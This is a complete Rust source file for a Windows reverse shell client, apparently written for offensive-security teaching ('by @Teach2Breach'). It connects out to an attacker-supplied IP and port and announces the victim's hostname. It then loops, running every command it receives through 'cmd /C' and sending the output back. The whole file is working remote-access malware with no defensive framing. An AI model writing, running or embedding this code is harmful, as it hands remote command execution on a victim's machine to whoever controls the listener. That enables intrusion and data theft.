use std::net::{TcpStream, ToSocketAddrs};
use std::io::{Read, Write};
use std::process::Command;

fn main() {

    //let ip_addr = "127.0.0.1:8080";

    //make sure we have 2 arguments, the ip and port. if not, print help and exit
    if std::env::args().len() != 3 {
        println!("Usage: {} <ip> <port>", std::env::args().nth(0).unwrap());
        std::process::exit(1);
    }

    //collected the ip_addr from the commandline arguments in 2 parts, ip and port, and then combine them 
    let ip_addr = format!("{}:{}", std::env::args().nth(1).unwrap(), std::env::args().nth(2).unwrap());  

    let remote_addr = ip_addr.to_socket_addrs().unwrap().next().unwrap();

    let mut stream = TcpStream::connect(remote_addr).unwrap();

    //send my banner to the server
    stream.write(b"\nRevShell Client v0.1 - Windows Edition \n").unwrap();
    stream.write(b"by @Teach2Breach \n").unwrap();
    stream.write(b"Hello from client: ").unwrap();
    //get the hostname of the client, by running Command with cmd /c hostname, and send it to the server
    let hostname = Command::new("cmd")
        .args(&["/C", "hostname"])
        .output()
        .expect("failed to execute process");
    stream.write(&hostname.stdout).unwrap();
    stream.write(b"Waiting for commands... \n").unwrap();

    loop {
        let mut buffer = [0; 1024];
        match stream.read(&mut buffer) {
            Ok(n) => {
                if n == 0 {
                    break;
                } else {
                    let command = String::from_utf8_lossy(&buffer[..n]);

                    //make sure the command is not empty
                    if command == "" {
                        continue;
                    }

                    //if command is exit, exit the program cleanly
                    if command == "exit" {
                        std::process::exit(0);
                    }

                    //else execute the command in a child process

                    else {

                    //convert command for passing to Command::new
                    let command = command.trim_end_matches(char::from(0));
                        // Execute the command in a child process
                        let output = Command::new("cmd")
                            .args(&["/C", command])
                            .output()
                            .expect("failed to execute process");

                        // Write the output to the socket
                        stream.write(&output.stdout).unwrap();
                    }
                }
            }
            Err(e) => println!("Error: {}", e)
        }
    }
}
